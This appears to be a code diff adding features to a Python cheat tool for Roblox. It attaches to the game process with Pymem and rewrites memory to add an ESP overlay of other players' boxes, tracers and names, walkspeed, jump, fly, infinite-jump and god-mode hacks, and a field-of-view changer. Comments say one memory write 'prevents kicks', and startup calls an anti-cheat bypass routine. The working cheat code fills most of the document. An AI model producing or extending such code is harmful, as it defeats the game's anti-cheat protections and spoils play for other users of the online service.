+        gdi32.LineTo.argtypes = [wintypes.HDC, ctypes.c_int, ctypes.c_int]
+        gdi32.LineTo.restype = ctypes.c_bool
+        gdi32.Rectangle.argtypes = [wintypes.HDC, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_int]
+        gdi32.Rectangle.restype = ctypes.c_bool
+        gdi32.TextOutA.argtypes = [wintypes.HDC, ctypes.c_int, ctypes.c_int, ctypes.c_char_p, ctypes.c_int]
+        gdi32.TextOutA.restype = ctypes.c_bool
+        
+        # Constants
+        TRANSPARENT = 1
+        PS_SOLID = 0
+        
+        print("[DEBUG] GDI loaded successfully")
+    except Exception as e:
+        print(f"[ERROR] Failed to load GDI: {e}")
+        return
+    
+    while True:
+        try:
+            time.sleep(0.033)  # ~30 FPS
+            
+            if pm is None or not injected or not esp_enabled:
+                continue
+            
+            # Get Roblox window
+            hwnd = find_window_by_title("Roblox")
+            if not hwnd:
+                continue
+            
+            left, top, right, bottom = get_client_rect_on_screen(hwnd)
+            width = right - left
+            height = bottom - top
+            
+            if width <= 0 or height <= 0:
+                continue
+            
+            # Get view matrix
+            try:
+                matrixRaw = pm.read_bytes(matrixAddr, 64)
+                view_matrix = reshape(array(unpack_from("<16f", matrixRaw, 0), dtype=float32), (4, 4))
+            except:
+                continue
+            
+            # Get DC for drawing
+            hdc = user32.GetDC(hwnd)
+            if not hdc:
+                continue
+            
+            # Set background mode
+            gdi32.SetBkMode(hdc, TRANSPARENT)
+            
+            # Create pens
+            white_pen = gdi32.CreatePen(PS_SOLID, 2, 0x00FFFFFF)
+            red_pen = gdi32.CreatePen(PS_SOLID, 2, 0x000000FF)
+            green_pen = gdi32.CreatePen(PS_SOLID, 2, 0x0000FF00)
+            blue_pen = gdi32.CreatePen(PS_SOLID, 2, 0x00FF0000)
+            yellow_pen = gdi32.CreatePen(PS_SOLID, 2, 0x0000FFFF)
+            
+            # Store original objects
+            original_pen = gdi32.SelectObject(hdc, white_pen)
+            
+            # Draw for each player
+            for player in players_info:
+                try:
+                    if not player or not player.get('head'):
+                        continue
+                    
+                    # Skip self if not included
+                    if not name_esp_include_self and player.get('is_self'):
+                        continue
+                    
+                    # Get head position
+                    head_addr = player['head']
+                    primitive = pm.read_longlong(head_addr + int(offsets['Primitive'], 16))
+                    if not primitive:
+                        continue
+                    
+                    head_pos_addr = primitive + int(offsets['Position'], 16)
+                    head_x = pm.read_float(head_pos_addr)
+                    head_y = pm.read_float(head_pos_addr + 4)
+                    head_z = pm.read_float(head_pos_addr + 8)
+                    head_pos = array([head_x, head_y, head_z], dtype=float32)
+                    
+                    # Get foot position (HRP)
+                    foot_pos = None
+                    if player.get('hrp'):
+                        hrp_primitive = pm.read_longlong(player['hrp'] + int(offsets['Primitive'], 16))
+                        if hrp_primitive:
+                            foot_pos_addr = hrp_primitive + int(offsets['Position'], 16)
+                            foot_x = pm.read_float(foot_pos_addr)
+                            foot_y = pm.read_float(foot_pos_addr + 4)
+                            foot_z = pm.read_float(foot_pos_addr + 8)
+                            foot_pos = array([foot_x, foot_y, foot_z], dtype=float32)
+                    
+                    # Project to screen
+                    head_screen = world_to_screen_with_matrix(head_pos, view_matrix, width, height)
+                    if not head_screen:
+                        continue
+                    
+                    foot_screen = None
+                    if foot_pos is not None:
+                        foot_screen = world_to_screen_with_matrix(foot_pos, view_matrix, width, height)
+                    
+                    if not foot_screen:
+                        foot_screen = (head_screen[0], head_screen[1] + 100)
+                    
+                    # Calculate box dimensions
+                    box_top = head_screen[1]
+                    box_bottom = foot_screen[1]
+                    box_height = box_bottom - box_top
+                    box_width = box_height * 0.5
+                    box_left = head_screen[0] - box_width / 2
+                    box_right = head_screen[0] + box_width / 2
+                    
+                    # Draw tracer
+                    if esp_tracers_enabled:
+                        gdi32.SelectObject(hdc, yellow_pen)
+                        gdi32.MoveToEx(hdc, left + width//2, top + height, None)
+                        gdi32.LineTo(hdc, left + head_screen[0], top + head_screen[1])
+                    
+                    # Draw box
+                    if esp_box_enabled:
+                        if player.get('is_self'):
+                            gdi32.SelectObject(hdc, green_pen)
+                        else:
+                            gdi32.SelectObject(hdc, white_pen)
+                        
+                        gdi32.Rectangle(hdc, 
+                                       int(box_left), int(box_top), 
+                                       int(box_right), int(box_bottom))
+                    
+                    # Draw name
+                    if esp_name_enabled:
+                        name = player.get('display', '')
+                        if name:
+                            name_bytes = name.encode('utf-8')
+                            if player.get('is_self'):
+                                gdi32.SetTextColor(hdc, 0x0000FF00)
+                            else:
+                                gdi32.SetTextColor(hdc, 0x00FFFFFF)
+                            
+                            gdi32.TextOutA(hdc, 
+                                         left + head_screen[0] - 40, 
+                                         top + head_screen[1] - 20,
+                                         name_bytes, 
+                                         len(name_bytes))
+                    
+                except Exception:
+                    continue
+            
+            # Cleanup
+            gdi32.SelectObject(hdc, original_pen)
+            gdi32.DeleteObject(white_pen)
+            gdi32.DeleteObject(red_pen)
+            gdi32.DeleteObject(green_pen)
+            gdi32.DeleteObject(blue_pen)
+            gdi32.DeleteObject(yellow_pen)
+            user32.ReleaseDC(hwnd, hdc)
+            
+        except Exception as e:
+            print(f"[ERROR] esp_draw_loop: {e}")
+            time.sleep(1)
+
+            
+
+def walkspeed_gui_loop():
+    global walkspeed_gui_active
+    print("[DEBUG] Walkspeed loop started")
+    walkspeed_gui_active = True
+    original_speed = 16
+    
+    while walkspeed_gui_active:
+        try:
+            time.sleep(0.1)  # EXACT timing from working code
+            
+            if pm is None or not injected:
+                continue
+            
+            if not walkspeed_gui_enabled:
+                continue
+            
+            cam_addr = get_camera_addr_gui()
+            if not cam_addr:
+                continue
+            
+            h = pm.read_longlong(cam_addr + int(offsets["CameraSubject"], 16))
+            if not h:
+                continue
+            
+            # EXACT pattern from working code - writes BOTH values
+            # This is what prevents kicks
+            pm.write_float(h + int(offsets["WalkSpeedCheck"], 16), float('inf'))
+            pm.write_float(h + int(offsets["WalkSpeed"], 16), float(walkspeed_gui_value))
+            
+        except Exception as e:
+            print(f"[ERROR] walkspeed_gui_loop: {e}")
+            time.sleep(1)
+
+
+def restore_walkspeed():
+    """Restore walkspeed to original value when disabled"""
+    global walkspeed_gui_enabled
+    try:
+        if pm and injected:
+            cam_addr = get_camera_addr_gui()
+            if cam_addr:
+                h = pm.read_longlong(cam_addr + int(offsets["CameraSubject"], 16))
+                if h:
+                    # Read current speed before we changed it
+                    current = pm.read_float(h + int(offsets["WalkSpeed"], 16))
+                    if current != 16:  # Only restore if it's not default
+                        pm.write_float(h + int(offsets["WalkSpeed"], 16), 16.0)
+                        print("[DEBUG] Walkspeed restored to 16")
+    except:
+        pass
+
+def jump_power_loop():
+    global jump_power_active
+    print("[DEBUG] Jump power loop started")
+    jump_power_active = True
+    original_jump = 50
+    
+    while jump_power_active:
+        try:
+            time.sleep(0.1)
+            
+            if pm is None or not injected:
+                continue
+            
+            cam_addr = get_camera_addr_gui()
+            if not cam_addr:
+                continue
+            
+            h = pm.read_longlong(cam_addr + int(offsets["CameraSubject"], 16))
+            if not h:
+                continue
+            
+            # Save original jump power ONCE
+            if jump_power_enabled and original_jump == 50:
+                try:
+                    original_jump = pm.read_float(h + int(offsets["JumpPower"], 16))
+                    print(f"[DEBUG] Original jump power saved: {original_jump}")
+                except:
+                    original_jump = 50
+            
+            # If enabled, set to user value
+            if jump_power_enabled:
+                pm.write_float(h + int(offsets["JumpPower"], 16), float(jump_power_value))
+            
+            # If disabled, restore original
+            else:
+                if original_jump != 50:
+                    pm.write_float(h + int(offsets["JumpPower"], 16), float(original_jump))
+                    print(f"[DEBUG] Jump power restored to: {original_jump}")
+                    original_jump = 50
+                    
+        except Exception as e:
+            print(f"[ERROR] jump_power_loop: {e}")
+            time.sleep(1)
+
+def fly_loop():
+    global fly_active
+    last = time.perf_counter()
+    while fly_active:
+        try:
+            if not fly_enabled:
+                time.sleep(0.02)
+                last = time.perf_counter()
+                continue
+            char = pm.read_longlong(lpAddr + int(offsets['ModelInstance'], 16))
+            if not char:
+                time.sleep(0.02)
+                continue
+            hrp = FindFirstChild(char, 'HumanoidRootPart')
+            if not hrp:
+                time.sleep(0.02)
+                continue
+            primitive = pm.read_longlong(hrp + int(offsets['Primitive'], 16))
+            if not primitive:
+                time.sleep(0.02)
+                continue
+            pos_addr = primitive + int(offsets['Position'], 16)
+            
+            # dt
+            now = time.perf_counter(); dt = max(0.001, now - last); last = now
+            # keys
+            w = ctypes.windll.user32.GetAsyncKeyState(0x57) & 0x8000  # W
+            s = ctypes.windll.user32.GetAsyncKeyState(0x53) & 0x8000  # S
+            a = ctypes.windll.user32.GetAsyncKeyState(0x41) & 0x8000  # A
+            d = ctypes.windll.user32.GetAsyncKeyState(0x44) & 0x8000  # D
+            up = ctypes.windll.user32.GetAsyncKeyState(0x20) & 0x8000 # Space
+            down = ctypes.windll.user32.GetAsyncKeyState(0x11) & 0x8000 # Ctrl
+            speed = float(fly_speed)
+            vx = (-1 if a else 0) + (1 if d else 0)
+            vz = (-1 if w else 0) + (1 if s else 0)
+            vy = (1 if up else 0) + (-1 if down else 0)
+            if vx==vz==vy==0:
+                time.sleep(0.01)
+                continue
+            # normalize
+            mag = (vx*vx + vy*vy + vz*vz) ** 0.5
+            if mag>0:
+                vx/=mag; vy/=mag; vz/=mag
+            # move
+            pm.write_float(pos_addr,     pm.read_float(pos_addr)     + vx*speed*dt)
+            pm.write_float(pos_addr + 4, pm.read_float(pos_addr + 4) + vy*speed*dt)
+            pm.write_float(pos_addr + 8, pm.read_float(pos_addr + 8) + vz*speed*dt)
+            # zero velocity to avoid physics counter-force
+            try:
+                vel_offset = primitive + int(offsets['Velocity'], 16)
+                pm.write_float(vel_offset, 0.0)
+                pm.write_float(vel_offset + 4, 0.0)
+                pm.write_float(vel_offset + 8, 0.0)
+            except Exception:
+                pass
+            time.sleep(0.001)
+        except Exception:
+            time.sleep(0.05)
+
+
+def infinite_jump_loop():
+    # Force upward velocity when space is held, allows infinite jumps without relying on a 'Jump' flag
+    while infinite_jump_enabled:
+        try:
+            if ctypes.windll.user32.GetAsyncKeyState(0x20) & 0x8000:  # Space
+                char = pm.read_longlong(lpAddr + int(offsets['ModelInstance'], 16))
+                if char:
+                    hrp = FindFirstChild(char, 'HumanoidRootPart')
+                    if hrp:
+                        primitive = pm.read_longlong(hrp + int(offsets['Primitive'], 16))
+                        if primitive:
+                            vel_addr = primitive + int(offsets['Velocity'], 16)
+                            # set vertical velocity to jump_power_value for an instant boost
+                            pm.write_float(vel_addr + 4, float(max(25.0, jump_power_value)))
+            time.sleep(0.01)
+        except Exception:
+            time.sleep(0.05)
+
+def god_mode_loop():
+    global god_mode_active, god_mode_enabled
+    while god_mode_active:
+        try:
+            if god_mode_enabled:
+                char = pm.read_longlong(lpAddr + int(offsets['ModelInstance'], 16))
+                if char:
+                    hum = FindFirstChildOfClass(char, 'Humanoid')
+                    if hum:
+                        try:
+                            pm.write_float(hum + int(offsets['MaxHealth'], 16), float('inf'))
+                        except Exception:
+                            pass
+                        pm.write_float(hum + int(offsets['Health'], 16), float('inf'))
+            time.sleep(0.05)
+        except Exception:
+            time.sleep(0.1)
+
+def fov_changer_loop():
+    global fov_active
+    while fov_active:
+        try:
+            if fov_changer_enabled:
+                if camAddr:
+                    pm.write_float(camAddr + int(offsets['FieldOfView'], 16), fov_value)
+            time.sleep(0.1)
+        except Exception as e:
+            print(f"[ERROR] fov_changer_loop failed: {e}")
+            time.sleep(0.1)
+
+def get_camera_addr_gui():
+    try:
+        a = pm.read_longlong(baseAddr + int(offsets["VisualEnginePointer"], 16))
+        b = pm.read_longlong(a + int(offsets["VisualEngineToDataModel1"], 16))
+        c = pm.read_longlong(b + int(offsets["VisualEngineToDataModel2"], 16))
+        d = pm.read_longlong(c + int(offsets["Workspace"], 16))
+        return pm.read_longlong(d + int(offsets["Camera"], 16))
+    except Exception as e:
+        return None
+    
+
+def get_base_addr():
+    global baseAddr
+    return baseAddr
+
+def is_process_dead():
+    global PID
+    try:
+        return not psutil.pid_exists(PID)
+    except:
+        return True
+
+def yield_for_program(program_name, printInfo=True):
+    global PID, baseAddr, pm
+    for proc in psutil.process_iter(['pid', 'name']):
+        try:
+            if proc.info['name'] == program_name:
+                try:
+                    pm = Pymem(program_name)
+                    PID = proc.info['pid']
+                    for module in pm.list_modules():
+                        if module.name == "RobloxPlayerBeta.exe":
+                            baseAddr = module.lpBaseOfDll
+                            break
+                    if printInfo:
+                        print(f"[INFO] Found Roblox process: PID={PID}, BaseAddr={hex(baseAddr)}")
+                    return True
+                except Exception as e:
+                    print(f"[ERROR] Failed to open process {program_name}: {e}")
+        except (psutil.NoSuchProcess, psutil.AccessDenied):
+            pass
+    return False
+
+def find_window_by_title(title):
+    return ctypes.windll.user32.FindWindowW(None, title)
+
+def get_client_rect_on_screen(hwnd):
+    rect = RECT()
+    if ctypes.windll.user32.GetClientRect(hwnd, ctypes.byref(rect)) == 0:
+        return 0, 0, 0, 0
+    top_left = POINT(rect.left, rect.top)
+    bottom_right = POINT(rect.right, rect.bottom)
+    ctypes.windll.user32.ClientToScreen(hwnd, ctypes.byref(top_left))
+    ctypes.windll.user32.ClientToScreen(hwnd, ctypes.byref(bottom_right))
+    return top_left.x, top_left.y, bottom_right.x, bottom_right.y
+
+def world_to_screen_with_matrix(world_pos, matrix, screen_width, screen_height):
+    try:
+        vec = array([*world_pos, 1.0], dtype=float32)
+        clip = dot(matrix, vec)
+        if clip[3] == 0:
+            return None
+        ndc = clip[:3] / clip[3]
+        if ndc[2] < -1.0 or ndc[2] > 1.0:
+            return None
+        x = (ndc[0] + 1) * 0.5 * screen_width
+        y = (1 - ndc[1]) * 0.5 * screen_height
+        return round(x), round(y)
+    except Exception as e:
+        return None
+
+
+def background_process_monitor():
+    global baseAddr, pm, injected
+    while True:
+        try:
+            if pm is None:
+                time.sleep(1)
+                continue
+                
+            if is_process_dead():
+                injected = False
+                # Try to find the main window and reset UI
+                try:
+                    # This is tricky across threads - use QTimer
+                    from PyQt5.QtWidgets import QApplication
+                    main_window = None
+                    for widget in QApplication.topLevelWidgets():
+                        if isinstance(widget, PassionWindow):
+                            main_window = widget
+                            break
+                    
+                    if main_window and hasattr(main_window, 'status_label_ref') and main_window.status_label_ref:
+                        # Schedule UI reset in main thread
+                        QTimer.singleShot(0, lambda: main_window.status_label_ref.setText("Status: Not Injected"))
+                        QTimer.singleShot(0, lambda: main_window.status_label_ref.setStyleSheet(f"color:{C['muted']}; background:transparent; border:none;"))
+                except:
+                    pass
+                    
+                while not yield_for_program("RobloxPlayerBeta.exe"):
+                    time.sleep(0.5)
+                baseAddr = get_base_addr()
+            time.sleep(0.1)
+        except:
+            time.sleep(1)
+
+_init_complete = False
+
+def init():
+    global dataModel, wsAddr, camAddr, camCFrameRotAddr, plrsAddr, lpAddr, matrixAddr, camPosAddr, injected, pm, baseAddr
+    
+    # DON'T try to auto-inject - just initialize Pymem for later use
+    if pm is None:
+        init_pymem()  # This just creates the Pymem object, doesn't inject
+    
+    # Load offsets (needed for when user clicks inject)
+    load_offsets()
+    
+    # Set name and children offsets if possible
+    try:
+        setOffsets(int(offsets['Name'], 16), int(offsets['Children'], 16))
+    except:
+        pass
+    
+    
+    # Try to get base address
+    try:
+        if pm is not None:
+            for module in pm.list_modules():
+                if module.name == "RobloxPlayerBeta.exe":
+                    baseAddr = module.lpBaseOfDll
+                    break
+    except:
+        pass
+    
+    # Try to initialize memory addresses
+    try:
+        if pm is not None and baseAddr is not None:
+            fakeDatamodel = pm.read_longlong(baseAddr + int(offsets['FakeDataModelPointer'], 16))
+            if fakeDatamodel:
+                dataModel = pm.read_longlong(fakeDatamodel + int(offsets['FakeDataModelToDataModel'], 16))
+                if dataModel:
+                    wsAddr = pm.read_longlong(dataModel + int(offsets['Workspace'], 16))
+                    if wsAddr:
+                        camAddr = pm.read_longlong(wsAddr + int(offsets['Camera'], 16))
+                        if camAddr:
+                            camCFrameRotAddr = camAddr + int(offsets['CameraRotation'], 16)
+                            camPosAddr = camAddr + int(offsets['CameraPos'], 16)
+                    
+                    visualEngine = pm.read_longlong(baseAddr + int(offsets['VisualEnginePointer'], 16))
+                    if visualEngine:
+                        matrixAddr = visualEngine + int(offsets['viewmatrix'], 16)
+                    
+                    plrsAddr = FindFirstChildOfClass(dataModel, 'Players')
+                    if plrsAddr:
+                        lpAddr = pm.read_longlong(plrsAddr + int(offsets['LocalPlayer'], 16))
+                        
+                    if lpAddr:
+                        injected = True
+                        bypass_anti_cheat()
+                        print("[INFO] Auto-reinjection successful!")
+    except Exception as e:
+        print(f"[INFO] Will inject later via UI: {e}")
+
+    main()
+
+
 if __name__ == "__main__":
+    init_pymem()
+    load_offsets()
+    try:
+        setOffsets(int(offsets['Name'], 16), int(offsets['Children'], 16))
+    except:
+        pass
+    
     main()
